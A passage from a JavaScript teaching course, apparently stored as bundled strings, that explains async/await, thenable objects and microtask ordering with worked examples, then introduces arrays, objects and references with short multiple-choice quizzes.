method\n\nLet's create an object which has the method **~then()~**:\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst user = {\n  name: 'Polina',\n  then (callback) {\n    callback(this.name)\n  }\n}\n\nuser.then(console.log)\nconsole.log('finish')\n~~~\n~~~console\nPolina\nfinish\n~~~\n\nObviously, the object **~user~** is **not** a ~Promise~ instance, and no asynchrony is observed yet.\n\nHowever, let's see what happens when this code is executed:\n\n~~~js\nconst test = async () => console.log(await user)\ntest()\nconsole.log('finish')\n~~~\n~~~console\nfinish\nPolina\n~~~\n\nAs you can see, when the engine detected the keyword **~await~**, it didn't bother much about what expression followed it, and it wasn't bothered at all by the fact that it wasn't a ~Promise~ instance.\nThe engine detected that it is an object that has a **~then()~** method.\n\nAnd what do we see? The **~then()~** method of the **~user~** object was called!\n\nBut there is one mystery here:\nThe **~then()~** method of the **~user~** object is a higher-order function,\ni.e. it expects to receive one mandatory argument when called - **function**.\nBut we did not pass any argument to the **~then()~** method of the **~user~** object.\nMoreover, we didn't call it at all!\n\nIt turns out that the engine not only called the **~then()~** method of the **~user~** object, but also passed a certain function as an argument to it.\n\nQuestion: what callback did the engine pass to the **~then()~** method of the **~user~** object?\n\nFrom the behaviour of the method **~then()~**, it seems that it has received this callback:\n\n~~~js\nresponse => response\n~~~\n\ni.e. callback function, which operates according to the principle: ‘What I get is what I give back’.\n\nAs you can see, when the engine meets one small word **~await~**, it starts a flurry of activity.\n\nOne last ‘touch’: in the previous example, the method **~then~** of the **~user~** object was a higher-order function, i.e. it took a function as an argument.\nLet's see what happens if the **~then~** method is an ordinary function:\n\n~~~js\nconst user = {\n  name: 'Polina',\n  then () {\n    console.log(this.name)\n  }\n}\n\n;(async () => {\n  await user\n  console.log('Hi from Event Loop')\n})()\n\nconsole.log('finish')\n~~~\n\n~~~console\nfinish\nPolina\n~~~\n\nAs you can see, the string:\n\n~~~js\nconsole.log('Hi from Event Loop')\n~~~\n\nwas never executed.\nThis means that the asynchronous function is waiting for the return of the callback function, but there is no callback function at all, and the asynchronous function could not resume its execution after **~await~**.\nThat is, the asynchronous function could return from the **Event Loop** only after the return of the callback function sent there by the method **~then~**.\nBut the method **~then~** didn't send anything to the event loop.\n![ico-25 warn] Be careful!\n\n_____________________________________\n\n### ![ico-20 icon] Promises' reminder\n\nWe have already said that a copy of the **~Promise~** constructor is a `magic box with two holes`.\n**~then()~** and **~catch()~** methods are the \"holes\" in the box.\nThrough these \"holes\" we put in our callback functions, and the box \"promises\" us that as soon as the contents appear in it, one of our callbacks will receive it.\n\n@@@@ 2\nIt is not known when the contents will appear in the box.<br>What will this content be - a \"white ball\" (**response**) or \"black ball\" (**error**) also unknown.\n![](illustrations/white-and-black.png)\n@@@@\n\n~~~~js\nconst getStatus = async () => Math.random() > .5 ? 'white' : 'black'\n\nconst func = ((startTime, callback) => {\n  const time = Math.round(Math.random() * 30000)\n  return async timeStamp => {\n    const interval = timeStamp - startTime\n    if (interval < time) requestAnimationFrame(func)\n    else callback(await getStatus())\n  }\n})(0, console.log)\n\nrequestAnimationFrame(func)\n~~~~\n\nIt should be noted that the promise box knows that it needs to \"catch\" a white or black ball when it arrives.\n\nAnd the magic box sends its own callback functions for the white and black balls to the **Event Loop**.\n\nCallbacks are already \"sitting\" in the table of events \"in ambush\".\nThey \"catch the balls\" for us.\nWhen caught, they will put it in the magic box of the **~Promise~** instance.\nThey are tied, respectively, to the following events:\n\n1. \"A white ball has arrived\" (response).\n2. \"A black ball has arrived\" (error).\n\nOnly one of them will return back from the **Event Loop**.\nThe contents will appear in the box of the **~Promise~** instance.\n\n{{{async-await-05.js}}}\n\nNow a magic box with two holes is waiting for you to stick your \"hands\" (**~resolve~** and **~reject~** callbacks), into these holes, to which the box can give the ball.\n\nPerhaps, you have already \"stick your hands in\" before, then you will receive the ball as soon as it appears in the box of the **~Promise~** instance.\nOtherwise, the ball will remain in the box until you use the methods **~then()~** and **~catch()~**, i.e. until you \"stick your hands in\" to pick up the ball.\n\n![ico-30 point_up] It follows that the magic box synchronizes two autonomous asynchronous processes.\nThis is the magical power of a \"box with two holes\".\n\nThose, the 'magic promise box' sends its own callback functions \"to run out and get the ball\", and then waits for you to stick your hands (callbacks) into the holes **~then()~** and **~catch()~** to give out the ball from storage.\n\n^^Moreover, you can stick both hands (**~resolve~** и **~reject~**) into one hole **~then()~**, although using the second hole **~catch()~** in some cases saves you from error messages in the console.^^\n\n☼☼☼Don't make the console blush for you.☼☼☼\n\n_________________________________________\n\n### ![ico-20 icon] await &lt;expression>\n\nSo, the engine meets the expression ~**await** &lt;expression>~.\nIt needs to calculate the value of this expression.\n![ico-25 warn] Until it calculates it and replaces the ~await &lt;expression>~ with the received (calculated) value, it will not move to the next line of asynchronous function code.\n\nIf the value is a reference to the **~Promise~**, instance, then the engine will call the method **~then()~** of this instance and pass the callback to it:\n\n~~~js\nresponse => response\n~~~\n\nand will pause the execution of the asynchronous function until the callback function returns from **Event Loop** with the result \"ball\" (~response~) and puts it in the box (~Promise~ instance).\n\nAfter the result appears in the box, the engine will take it out of the box and insert it into the place of the ~await &lt;expression>~.\n\nWe've already asked ourselves what the engine will do if ~&lt;expression>~ is not a promise.\nAnd we have already figured out what the engine will do if ~&lt;expression>~ is an object that has a **~then()~** method.\n\nNow let's see what the engine will do if ~&lt;expression>~ is a string, or a number, or some other value.\n\n◘◘![ico-25 cap] ** 6**◘◘\n~~~js\nconsole.log('Start')\n;(async function () {\n  console.log('Async function starts')\n  console.log(await 'Hello!')\n  console.log('Async function finished')\n})()\nconsole.log('Finish')\n~~~\n\nIn this example, you need to carefully monitor the sequence of messages output to the console:\n\n~~~console\nStart\nAsync function starts\nFinish\nHello!\nAsync function finished\nundefined\n~~~\n\nEverything that is printed to the console after the **_Finish_** message is the callback functions that \"passed\" through the **Event Loop**.\nIf they are printed before ~undefined~ these are **microtasks**.\n\nSo, the engine was safely outputting ^^**_Start_**^^ to the console, then it came across a functional expression ([IIFE](page/Closure#IIFE)) and started ‘calculating’ the value of the expression in parentheses.\nBut we see the declaration of an anonymous asynchronous function in the parentheses.\nThe engine passes the control to the constructor, which creates this function and returns a reference to it.\nThe engine, having received a reference to the function, calls it, as the parentheses (function call) follow.\nThe anonymous asynchronous function starts executing, and the console displays the message ^^**_Async function starts_**^^.\nHowever, in the next line of the function's code, the engine \"stumbled upon\" an expression:\n\n~~~js\nconsole.log(await 'Hello!')\n~~~\n\nHere the engine understands that it is necessary to send a callback function ~() => 'Hello!''~ to **Event Loop**, and the async function must wait for its return to complete the execution of this line of code.\nThe engine couldn't resume the async function execution until the callback function ~() => 'Hello!''~ returns.\nBut callback function can return only when the Call Stack will be free.\nSo, the engine needs to ‘get rid’ of this async function for a while, but in such a way that after the return of the callback ~() => 'Hello!''~ it can resume the execution of async function.\nHow can this be done?\n\nFor example, by replacing the remaining unexecuted function code:\n\n~~~js\nconsole.log(await 'Hello!')\nconsole.log('Async function finished')\n~~~\n\nto this code:\n\n~~~js\nPromise.resolve('Hello!')\n  .then(message => {\n    console.log(message)\n    console.log('Async function finished')\n  })\n~~~\n\nAnd then the engine continues to execute the script code from the line:\n\n~~~js\nconsole.log('Finish')\n~~~\n\nafter which the call stack is freed, and a callback function ~() => 'Hello!''~ is returned from **Event Loop**:\n\n~~~js\nmessage => {\n  console.log(message)\n  console.log('Async function finished')\n}\n~~~\n\nwhich received a message with the value 'Hello!'.\n\nThus, the occurrence of the keyword **~await~** causes the unexecuted remainder of the asynchronous function code to become a callback function.\n\n_____________________________________________\n\n## ![ico-20 icon] Examples\n\n### ![ico-25 cap] 7\n\nIn this example, we specifically named the function **~test~** to track its appearance in the call stack.\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconsole.log('Start')\n\n;(async function test (callback) {\n  const inputs = []\n  inputs.push(await 5)\n  inputs.push(await 7)\n  inputs.push(await 9)\n  const result = inputs\n    .reduce((res, num) => res += num)\n  callback(await result)\n})(console.log)\n\nconsole.log('Finish')\n~~~\n\n![](illustrations/async-await-7.gif)\n\n__________________________________________________________________________\n\n### ![ico-25 cap] 8\n\nIn this example, the main thread code will run when the variable ~num~ is set to ** 5**.\nHowever, calling the asynchronous ~sample()~ function will result in the value of the variable ~num~ becomes **10** after the main thread's code has finished running.\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nlet num = 5\n\nasync function sample (arg) {\n  num = await arg\n}\n\nsample(10)\n  .then(() => console.log(`Finish value: ${num}`))\n\nconsole.log('Start value: ', num)\n~~~\n\n••Start value:  5••\n••Finish value: 10••\n\n_________________________________\n\n### ![ico-25 cap] 9\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nasync function getUser (userNum) {\n  return (await (await fetch(`https://api.github.com/users/${userNum}`)).json()).name\n}\n\ngetUser(5)\n  .then(console.log)\n~~~\n\n**Output**:\n\n••Yuriy Semchyshyn••\n\n_____________________________________\n\n### ![ico-25 cap] 10\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\nconst browsers = ['Chrome', 'Mozilla', 'Safari', 'IE']\n\nbrowsers.then = (function () {\n  let current = 0\n\n  return function (resolve) {\n    const response = {\n      value: this[current++],\n      done: current > this.length\n    }\n\n    setTimeout(() => resolve.call(null, response), 1000)\n  }\n})()\n\nasync function showBrowsers () {\n  do {\n    var { done, value } = await browsers\n\n    console.log(`{ value: ${value}, done: ${done} }`)\n  } while (!done)\n}\n\nshowBrowsers ()\n~~~\n\n{{{async-await-6.js}}}\n\n____________________________________________________________\n\n### ![ico-25 cap] 11\n\n◘◘![ico-25 cap] **11**◘◘\n\n~~~js\n(function demo (maxValue) {\n  const placeholder = document.body\n    .appendChild(document.createElement('h3'))\n\n  while (maxValue--) {\n    const number = maxValue\n    setTimeout(async () => Object.assign(placeholder, {\n      innerText: await number\n    }), number * 1000)\n  }\n})(10)\n~~~\n\n{{{async-await-11.js}}}\n\n____________________________________________________________\n\n### ![ico-25 cap] 12\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\n;(async () => await 'async-await')().then(console.log)\n\nPromise.resolve('promise').then(console.log)\n\n;(async () => 'async')().then(console.log)\n~~~\n\n~~~console\npromise\nasync\nasync-await\n~~~\n\nNote that:\n\n1. The ~Promise~ instance returned by ~async () => await 'async-await'~ will be resolved last, even though it is the first line of code.\n2. The ~Promise.resolve('promise')~ (second line of code) will be resolved first.\n3. The ~Promise~ instance returned by ~async () => 'async'~ (third line of code) will be resolved second.\n\nHaving castling of the second and third lines of the code:\n\n~~~js\n;(async () => await 'async-await')().then(console.log)\n\n;(async () => 'async')().then(console.log)\n\nPromise.resolve('promise').then(console.log)\n~~~\n\nwe will see that the order of the console output has changed accordingly:\n\n~~~console\nasync\npromise\nasync-await\n~~~\n\nthat is, their callback functions end up in the microtask queue in the same sequence in which they appeared in the code.\n\nBut with the function ~async () => await 'async-await'~ it's different.\n\nLet's show that the code:\n\n~~~js\n;(async () => await 'async-await-1')().then(console.log)\n~~~\n\nworks identical to the code:\n\n~~~js\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n~~~\n\nTo do this, let’s run them first in the following sequence:\n\n~~~js\n;(async () => await 'async-await-1')().then(console.log)\n\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n~~~\n\n~~~console\nasync-await-1\nasync-await-2\n~~~\n\nand then change the order of them:\n\n~~~js\nnew Promise(resolve => resolve('async-await-2'))\n  .then(response => response)\n  .then(console.log)\n\n;(async () => await 'async-await-1')().then(console.log)\n~~~\n\n~~~console\nasync-await-2\nasync-await-1\n~~~\n\nAs we can see, they are resolved strictly in the order they appear in the code.\nThat is, the occurrence of the keyword **~await~** elongates the chain of callback functions passing through **Event Loop** by 1, which results in ~;(async () => await 'async-await')().then(console.log)~ being the last to finish in Example 12.\n\nAs we said earlier, the asynchronous function itself is interrupted at the point where **~await~** is met, and the rest of the code of this function, which was not executed before, itself becomes a callback function and \"goes\" into the **Event Loop** to free the Call Stack and allow the callback ~() => 'async-await'~ to return with the result ('async-await'). Therefore, the chain is extended by 1 microtask.\n\n______________________________________________\n\n### ![ico-25 cap] 13\n\n◘◘![ico-25 cap] **13**◘◘\n\n~~~js\nconst promise = message => new Promise(resolve => {\n  const time = Math.round(Math.random() * 3000)\n  setTimeout(() => resolve(`${message}: ${time}`), time)\n})\n\nconst test = async () => await promise(await promise(await promise('start')))\n\ntest().then(response => console.log(response))\n~~~\n\n{{{async-await-13.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 14\n\nLet's declare a helper function:\n\n~~~js\nconst createElem = tag => document.body.appendChild(document.createElement(tag))\n~~~\n\n◘◘![ico-25 cap] **14**◘◘\n\n~~~js\nconst promise = message => new Promise(resolve => Object.assign(createElem('input'), {\n  placeholder: message,\n  style: `\n    padding: 8px 16px;\n    border-radius: 4px;\n  `,\n  onchange: event => resolve(event.target.value)\n}))\n\nconst func = async () => Object.assign({}, {\n  name: await promise('Your name'),\n  hobby: await promise('Your hobby'),\n  speciality: await promise('Your speciality')\n})\n\nfunc().then(response => console.log(response))\n~~~\n\n{{{async-await-9.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 15\n\n◘◘![ico-25 cap] **15**◘◘\n\n~~~JS\nconst promise = message => new Promise(resolve => Object.assign(createElem('input'), {\n  placeholder: message,\n  onchange: event => resolve(event.target.value)\n}))\n\nconst func = async () => {\n  const user = {}\n  const messages = ['name', 'hobby', 'speciality']\n\n  const responses = await Promise.all(messages.map(message => promise(message)))\n\n  responses.forEach((val, index) => Object.assign(user, { [messages[index]]: val }))\n  return user\n}\n\nfunc().then(console.log)\n~~~\n\n{{{async-await-10.js}}}\n\n______________________________________________\n\n### ![ico-25 cap] 16\n\nLet's record the value of the current time in milliseconds in the **~start~** variable and declare the auxiliary functions **~getRandom~** and **~test~**:\n\n~~~js\nconst start = Date.now()\n\nconst getRandom = () => Math.round(Math.random() * 5000)\n\nconst test = ms => Date.now() - start >= ms\n~~~\n\nNow let's declare the functions **~func~** and **~createPromise~**:\n\n~~~js\nfunction func (name, time, callback) {\n  test(time)\n    ? callback(`${name}: ${time}`)\n    : requestAnimationFrame(func.bind(null, name, time, callback))\n}\n\nfunction createPromise (name, time) {\n  return new Promise(func.bind(null, name, time))\n}\n~~~\n\nNow let's run the code:\n\n◘◘![ico-25 cap] **16**◘◘\n\n~~~js\n;['First', 'Second', 'Third']\n  .forEach(name => createPromise(name, getRandom()).then(console.log))\n~~~\n\n{{{async-await-16.js}}}\n\nAs you can see, messages are output in a random order, depending on what value the **~getRandom~** function returned for each ~Promise~ instance.\n\nThe task is to synchronize the entry of callback functions into the Call Stack so that the first output to the console is \"**_First_**\", then \"**_Second_**\", and then \"**_Third_**\".\n\n◘◘**promise chain**◘◘\n\n~~~js\ncreatePromise('First', getRandom())\n  .then(console.log)\n  .then(() => createPromise('Second', getRandom()).then(console.log))\n  .then(() => createPromise('Third', getRandom()).then(console.log))\n~~~\n\n◘◘**async function**◘◘\n\n~~~js\nconst showResults = async () => {\n  const promises = ['First', 'Second', 'Third']\n    .map(name => createPromise(name, getRandom()))\n\n  for (const promise of promises) console.log(await promise)\n}\n\nshowResults()\n~~~\n\nSo, an asynchronous function can serve as a “wrapper” for several asynchronous operations, the execution of which should be ordered in time, to enforce their callbacks are processed in a given sequence.\n\n________________________________\n\n### ![ico-25 cap] 17\n\nLet's consider a purely speculative option\n^^(you shouldn't do this in real  projects)^^:\n\n◘◘![ico-25 cap] **17**◘◘\n\n~~~js\nconst origin = 'https://garevna-json-server.glitch.me'\n\nconst users = ['Stephan', 'Andry']\n  .reduce(async (result, item) => {\n    const data = await (await fetch(`${origin}/users?name=${item}`)).json()\n    result = await result\n    result.push(data[0])\n    return result\n  }, [])\n~~~\n\nWhat you should pay attention to:\n\nthe **~reduce~** method is passed an async function.\nTherefore, after each iteration, the **~result~** variable will be a ~Promise~ instance,\nand it must be resolved using **await**.\n\nAs a result of the script running, the **~users~** variable will contain a ~Promise~ instance.\nLet's extract the result:\n\n~~~js\nusers.then(console.log)\n~~~\n\n![ico-20 yes] to reduce the number of calls to the server, it is better to do this:\n\n~~~js\nfetch(`${origin}/users?name=Stephan&name=Andry`)\n  .then(response => response.json())\n  .then(console.log)\n~~~\n\nor this:\n\n~~~js\nconst origin = 'https://garevna-json-server.glitch.me'\n\nconst getEndpoint = userList => userList\n  .reduce((result, item, index) => result += `${index > 0 ? '&' : ''}name=${item}`, '')\n\nconst getUsers = async userList => await (await fetch(`${origin}/users?${getEndpoint(userList)}`)).json()\n\ngetUsers(['Stephan', 'Andry'])\n  .then(console.log)\n~~~\n\n___________________________________________\n\n### ![ico-25 cap] 18\n\n~~~js\nconst origin = 'https://api.github.com'\n\nconst addElem = tagName => document.body\n  .appendChild(document.createElement(tagName))\n~~~\n\n◘◘![ico-25 cap] **18**◘◘\n\n~~~js\nasync function getUsersData (userName) {\n  const userData = await (await fetch(`${origin}/users/${userName}`)).json()\n\n  addElem('img').src = userData.avatar_url\n\n  const userRepos = await (await fetch(userData.repos_url)).json()\n\n  for (const item of userRepos) addElem('div').innerText = item.events_url\n\n  return 'Ready'\n}\n\ngetUsersData('garevna').then(console.log)\n~~~\n\n_________________________________________\n\n### ![ico-25 cap] 19\n\nLet's extend the prototype of the **~Object~** constructor with the **~addElem~** method:\n\n◘◘Object◘◘\n~~~js\nObject.prototype.addElem = function (tagName) {\n  const elem = document.body\n    .appendChild(document.createElement(tagName))\n  Object.assign(elem, {\n    addChar (char) {\n      elem.textContent += char\n    },\n    replace (text) {\n      elem.textContent = text\n    }\n  })\n  return elem\n}\n~~~\n\nAs we can see, the added element will have two methods: **~addChar~** and **~replace~**, which allow you to modify the text content of the element.\n\nNow let's extend the prototype of the **~String~** and **~Number~** constructors with the method **~then~**:\n\n◘◘String◘◘\n~~~js\nString.prototype.then = function () {\n  const placeholder = this.addElem('div')\n  this\n    .split('')\n    .forEach((char, index) => setTimeout(() => placeholder.addChar(char), 1000 * index))\n}\n~~~\n\n◘◘Number◘◘\n\n~~~js\nNumber.prototype.then = function () {\n  const placeholder = this.addElem('div')\n  for (let ind = 0; ind <= this; ind++) {\n    setTimeout(() => placeholder.replace(ind), 1000 * ind)\n  }\n}\n~~~\n\nNow you can create “simple” functions **~typeWritter~** and **~showNumber~**:\n\n◘◘![ico-25 cap] **19**◘◘\n\n~~~js\nconst typeWritter = async string => await Object(string)\nconst showNumber = async number => await Object(number)\n\ntypeWritter('Welcome')\nshowNumber(11)\n~~~\n\n_________________________________________\n\n[:::**20**:::](https://plnkr.co/edit/3JMiqa1CFLK55hgx/)\n\n_______________________\n[![ico-30 hw] Quiz](quiz/async)\n"},13918:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Data Structures\n\nGenerally speaking, now we are going to study **reference data type**.\nLet's try to understand what it is.\n\nFirstly, when we talk about any **data structures**, we mean some set of data collected under one name.\nFor example, a list of students in a group or a list of students in a class is a data structure because it contains dozens of string values (variables of type ‘string’).\nHowever, if you ask for a list of students in a group, you won't enumerate the contents of the list, especially since you may not know it. You would name the cipher of the group.\nThis is how you get a data structure.\nThe name is one, and there can be a lot of data stored under that name.\n\nWhy are these data of **reference data type**?\n\nBecause if you pass the name of a data structure, you do not pass its contents.\nYou are only passing a **reference** to the data structure.\n\nIf we pass this reference from one variable to another, we are not passing a group, but a **reference** to it.\n\nFor example, you have some data structure (such as a list of students in a group), a reference to which is stored in the variable **~group~**.\n\nAfter performing the assignment:\n\n~~~js\nvar students = group\n~~~\n\nvariable **~students~** will contain a reference to the same data structure.\nNo new data structure is created, only the **reference** is passed.\n\n@@@@\n![](illustrations/reference-is-a-lockpick-eng.svg)\n<br>If you have a reference to a data structure, you access the contents of that data structure by reference.<br>\n@@@@\n\nLet's take a closer look at data structures in JS. At least two of them - arrays and objects.\nThey differ in the way of organising access to data structure elements.\nIn arrays, the elements are strictly arranged in order, and they are accessed by their sequence number inside the collection.\nIn objects, there is no strict ordering, and instead of a sequence number, the elements of such a collection (structure) have unique identifiers by which we can find them in the collection.\n\n_________________________________________________\n\n## ![ico-30 icon] Arrays\n\n**data type: ~object~**\n\n• An array is an ordered set of variables.\n• Each variable is called an **array element**.\n• Array elements have an ordinal number (**_index_** of the array element).\n\n![ico-20 warn] The indexing of array elements starts from zero, i.e. the first array element will have index ~ 0~.\n\nDeclaring an array is very simple:\n\n~~~js\nvar array = [3.14, false, 'mother', null, undefined]\n~~~\n\nWhat you see on the right side of the assignment statement is an **expression**.\nBefore performing an assignment, the engine always evaluates the expression on the right side of the assignment operator.\nAnd on the right side of the assignment operator, the engine sees square brackets with a comma enumeration of the values inside the square brackets.\nThe engine understands that we want to create an array and creates an array (or rather, it calls a special constructor for this purpose, but we'll talk about that later).\nWe will never know where the engine placed the created data structure (array), because it only returned a **reference** to the array.\nIt is this reference that is placed in the **~array~** variable.\n![ico-25 warn] Not an array, but a **reference** to an array.\n\nNow the contents of the array can be accessed as follows:\n\n~~~js\narray[2]\n~~~\n\ni.e. we use the array name, followed by the **index** of the element in square brackets.\nThe index is an ordinal number starting from zero:\n\n| 0    | 1     | 2        | 3    | 4         |\n| 3.14 | false | 'mother' | null | undefined |\n\nAs a result, we get the value of the array element:\n\n~~~console\n'mother'\n~~~\n\nWe have more than read-only access to the array elements.\nThe following assignment will change the value of the last array element:\n\n~~~js\narray[4] = 'father'\n~~~\n\nAfter this assignment, our array will be like this:\n\n~~~console\n► (5) [3.14, false, 'mother', null, 'father']\n~~~\n\n___________________________________\n\nIf we now perform the following assignment:\n\n~~~js\nvar collection = array\n~~~\n\nthen the variable **~collection~~** will contain a reference to the same array.\n\nShall we check?\n\nLet's change an element of the array **~collection~~**:\n\n~~~js\ncollection[3] = 'brother'\n~~~\n\nand look at the array **~array~**:\n\n~~~js\narray\n~~~\n\n~~~console\n► (5) [3.14, false, 'mother', 'brother', 'father']\n~~~\n\nAs you can see, the changes we made (by reference!) to the **~collection~** array are reflected in the **~array~** array.\nThis is because both the **~collection~** variable and the **~array~** variable are **references to the same array**.\n\n### ![ico-25 icon] length\n\nArrays, like strings, have a property **~length~** (the length of the array, or the number of array elements).\n\nThis property can be accessed in **dot notation** (with a dot after the array name):\n\n~~~js\ncollection.length\n~~~\n\n~~~console\n5\n~~~\n\n_________________________________________\n\n### ![ico-25 hw] Tests\n\n◘◘![ico-20 hw] 1◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\n~~~\n\n→→→ students[1] | 'Piter', 'Madelin', 'Gregory', null, undefinded | Madelin →→→\n\n◘◘![ico-20 hw] 2◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\n~~~\n\n→→→ students[3] | 'Piter', 'Madelin', 'Gregory', null, undefinded | undefinded →→→\n\n◘◘![ico-20 hw] 3◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = students\ngroup[3] = 'Frodo'\n~~~\n\n→→→ students[3] | 'Piter', 'Madelin', 'Gregory', 'Frodo', null, undefinded | Frodo →→→\n\n◘◘![ico-20 hw] 4◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = []\ngroup[3] = students[0]\n~~~\n\n→→→ group.length | 0, 1, 2, 3, 4, undefinded | 4 →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar  students = ['Piter', 'Madelin', 'Gregory']\nvar group = []\ngroup[0] = students\n~~~\n\n→→→ group.length | 0, 1, 2, 3 | 1→→→\n\n◘◘![ico-20 hw] 6◘◘\n\n~~~js\nvar  students = ['Frodo', 'Stephan', 'Madelin', 'Helen']\nvar hello = 'Hi ' + students[1] + '!'\n~~~\n\n→→→ hello | 'Hi !', 'Hi Frodo!', 'Hi Stephan!', 'Hi Madelin!', 'Hi Helen!' | Hi Stephan!→→→\n\n_____________________________________________________________\n\n## ![ico-25 icon] Objects\n\n**data type: ~object~**\n\nIf we created arrays using square brackets, we will use curly braces ~{}~ to create objects.\nWe listed the contents of the array inside the square brackets using commas.\nThe indexes of the elements in the array were determined automatically based on the order in which they were listed.\nThe contents of the object will also be listed in commas, but there is a nuance: **object is not an ordered set of elements**.\nThe data that will be stored in the object will not have indexes, and instead of indexes we will use keys, i.e. text strings (type ‘string’).\nAnd while we called the data in the array **array elements**, we will call the data in the object **object properties**.\nEach property of an object has a **name** and a **value**.\n\nThis is how an **~human~** object with three properties is defined: **~name~**, **~age~**, and **~employed~**:\n\n◘◘![ico-25 cap] 5◘◘\n\n~~~js\nvar human = {\n  name: 'Frodo',\n  age: 35,\n  employed: true\n}\n~~~\n\nFor the engine to understand you correctly, the enumerated properties of an object inside curly braces must be the expression ~name: value~.\n\nThe property name is the **key** to access the value of the property, just as the index of an array element is the key to access an array element.\nWe can use **dot notation** to access the properties of an object:\n\n~~~js\nhuman.name\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nHowever, you can also use square brackets notation like arrays, only instead of integer indices inside square brackets you specify keys, i.e. strings:\n\n~~~js\nhuman['name']\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nWhy is this notation more convenient than dot notation?\n\nSuppose that the key name is in a variable:\n\n~~~js\nvar propName = 'name'\n~~~\n\nThen we can retrieve the value of the object property by the key stored in the **~propName~** variable:\n\n~~~js\nhuman[propName]\n~~~\n\n~~~console\n'Frodo'\n~~~\n\nWe can add properties to an object quite easily by ordinary assignment:\n\n~~~js\nhuman.hobby = ['sport', 'reading']\n~~~\n\nAfter this assignment, the **~human~** object will look like this in the console:\n\n~~~console\n▼ {name: 'Frodo', age: 35, employed: true, hobby: Array(2)}\n    age: 35\n    employed: true\n    hobby: (2) ['sport', 'reading']\n    name: \"Frodo\"\n  ► [[Prototype]]: Object\n~~~\n\nLater, you and I will find out what it is about the property ~[[[Prototype]]: Object~, which you and I did not add to the object, but which will be present in any object.\n\nTo remove properties, you must use the **~delete~** operator:\n\n~~~js\ndelete human.hobby\n~~~\n\nThis operator applies only to object properties, and returns the boolean value ~true~ or ~false~ depending on whether deletion has occurred or not.\n\n________________________________________________________\n\n### ![ico-25 hw] Tests\n\n◘◘![ico-20 hw] 1◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', [0, 1]]\n~~~\n\n→→→ typeof memo[4] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 2◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', { name: 'Figaro' }]\n~~~\n\n→→→ typeof memo[4] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 3◘◘\n\n~~~js\nvar memo = [1, false, 4.8, 'Google', { name: 'Figaro' }]\n~~~\n\n→→→ typeof memo[4].name | 'string', 'number', 'boolean', 'object', undefinded | string →→→\n\n◘◘![ico-20 hw] 4◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list[0] | 'string', 'number', 'boolean', 'object', undefinded | object →→→\n\n◘◘![ico-20 hw] 5◘◘\n\n~~~js\nvar list = [{ name: 'Google' }, { name: 'Mozilla' }, { name: 'Microsoft' }, { name: 'Apple' }]\n~~~\n\n→→→ typeof list[0].name | 'string', 'number', 'boolean', 'object', undefinded | string →→→\n\n◘◘![ico-20 hw] 6◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students.group | 'Dev-05', 'Programming', 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Dev-05 →→→\n\n◘◘![ico-20 hw] 7◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students[1] | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | undefinded →→→\n\n◘◘![ico-20 hw] 8◘◘\n\n~~~js\nvar  students = {\n  group: 'Dev-05',\n  course: 'Programming',\n  names: [\n    'Piter Clark',\n    'Helen Surmot',\n    'Pavel Farios',\n    'Alex Figa',\n    'Gregory Trump'\n  ]\n}\n~~~\n\n→→→ students.names[1] | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', undefinded | Helen Surmot →→→\n\n◘◘![ico-20 hw] 9◘◘\n\n~~~js\nvar  students = [\n  {\n    name: 'Piter Clark',\n    homeworks: [10, 7, 8, 5, 9, 6, 4, 8, 7]\n  },\n  {\n    name: 'Helen Surmot',\n    homeworks: [5, 4, 7, 6, 8, 7, 7, 6, 8]\n  },\n  {\n    name: 'Pavel Farios',\n    homeworks: [9, 8, 9, 10, 7, 7, 8, 6, 8]\n  },\n  {\n    name: 'Alex Figa',\n    homeworks: [4, 5, 4, 6, 7, 5, 6, 7, 8]\n  },\n  {\n    name: 'Gregory Trump',\n    homeworks: [3, 5, 4, 6, 5, 7, 6, 6, 7]\n  }\n]\n~~~\n\n→→→ students[4].name | 'Piter Clark', 'Helen Surmot', 'Pavel Farios', 'Alex Figa', 'Gregory Trump', 